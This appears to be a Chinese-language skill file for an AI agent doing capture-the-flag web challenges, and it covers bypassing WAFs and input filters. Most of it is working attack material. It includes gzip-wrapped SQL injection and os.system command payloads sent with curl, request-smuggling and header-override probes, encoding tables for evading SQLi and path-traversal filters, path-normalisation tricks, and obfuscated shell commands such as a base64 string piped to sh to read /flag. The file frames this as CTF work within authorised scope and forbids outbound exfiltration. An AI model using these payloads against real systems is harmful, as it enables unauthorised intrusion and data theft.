---
name: filter-bypass
description: 边界防护/过滤/检测绕过。请求被 403/空响应/拦截时加载，覆盖 Web 过滤定位、请求解析差异、编码与命令过滤的受测验证；检测类题目转 detection-evaluation。 使用 curl、gzip、python3。
---

# 边界防护 / 过滤绕过

## 0. 先定位拦截点（15s，不要盲目试）

```bash
# A. 正常请求基线
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://TARGET/?q=hello"
# B. 恶意 payload
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" "http://TARGET/?q=hello'UNION SELECT 1--"
```

判定：
- B 直接 403/空 → 可能在边界层或应用层拒绝；比较响应头、正文与后端可见效果
- B 返回 500/正常但结果不对 → 继续确认后端解析和错误来源
- B 无变化 → 可能没过滤，换注入点

## 1. 请求体压缩测试（仅目标支持解压时）

网关按明文匹配规则、但不解压请求体：

```bash
printf "%s" "username=admin' OR '1'='1'-- -&password=x" | gzip -c > body.gz
curl -s -i http://TARGET/login \
  -H "Content-Encoding: gzip" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary @body.gz
```

JSON 场景同理：
```bash
printf '{"code":"import os;os.system(\"cat /flag\")"}' | gzip -c > json.gz
curl -s -i http://TARGET/api/execute -H "Content-Encoding: gzip" \
  -H "Content-Type: application/json" --data-binary @json.gz
```

## 2. 传输层 / 协议差异

```bash
# 分块传输
curl -s -i -H "Transfer-Encoding: chunked" --data-binary @payload.txt http://TARGET/
# Content-Length 与 chunked 冲突（CL.TE / TE.CL 走私）
# 重复参数：?id=1&id=2  → 前端取第一个、后端取最后一个
# JSON vs form 互转：同一接口两种解析器，过滤只做了一种
# 路径/参数大小写：/Admin、?Id=
# 头覆盖：X-Forwarded-For、X-Original-URL、X-Rewrite-URL、X-Forwarded-Host
```

```bash
# 常见头覆盖速测
for h in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-For: 127.0.0.1" \
         "X-Forwarded-Host: localhost" "X-Forwarded-User: admin"; do
  printf "%-32s " "$h"; curl -s -o /dev/null -w "%{http_code}\n" -H "$h" http://TARGET/nope
done
```

## 3. 编码与关键字混淆

| 被拦 | 绕过 |
|---|---|
| `union select` | `union/**/select`、`/*!union*/select`、`UNioN SeLeCt`、`%55nion` |
| 单引号 `'` | `%27`、`%2527`（双重编码）、`\x27`、`char(39)` |
| 空格 | `/**/`、`%09`、`%0a`、`+`、`()` |
| `=` | `like`、`regexp`、`between` |
| `or` / `and` | `||`、`&&`、`oorr`、`O/**/R` |
| `../` | `....//`、`..%2f`、`%2e%2e/`、`..;/` |
| 关键字整体 | 参数拆分 `a=un&b=ion sel&c=ect` |

**路径归一化绕过**（nginx/apache 差异）：
```
/./admin        /admin/
/admin/.        /%2e/admin
/admin%2f       /admin/..
/public/static../   ← 拼接穿越（见 web-exploit）
```

## 4. 命令类过滤绕过

```bash
c\at /flag            # 反斜杠
c'a't /flag           # 引号拼接
cat$IFS/flag          # 变量分隔
${IFS}cat${IFS}/flag
echo Y2F0IC9mbGFn|base64 -d|sh
$'\x63\x61\x74' /flag
/bin/c?t /flag        # 通配符
```

## 5. 无回显时的判定

比较响应、时间、日志和题内可读文件等带内证据。赛场默认无出网，不使用外部 HTTP/DNS 回连或外带。

## 6. 检测类题目

若题目涉及终端、二进制特征、行为告警或沙箱，转 detection-evaluation。HTTP 403 只说明当前请求被拒绝，不能单独证明 WAF 所在层或命中规则。

## 7. 遍历顺序（照这个顺序，别乱试）

```
① 基线与拦截层  →  ② 确认后端可解析的输入形态  →  ③ 最小编码/协议差异试验  →  ④ 后端效果验证
```

每种先试最小样本；用后端效果判定，遇到明确线索可以继续深挖。

## 8. 反模式

- ❌ 只用一种编码无限重试（日志里最常见的浪费）。
- ❌ 不定位拦截点，直接猜 payload。
- ❌ 403 就直接放弃——先确认目标实际接受的编码，再验证服务端是否执行。
- ❌ 在 GET query 上试编码，而实际注入点在 body / header / cookie。

## 9. 输出

`拦截层判定 + 生效的绕过手法 + 后端实际执行结果/flag`。

每种变化只保留输入、对照和后端结果；没有可观察结果时不要宣称成功绕过。遵守当前题的授权范围与速率。
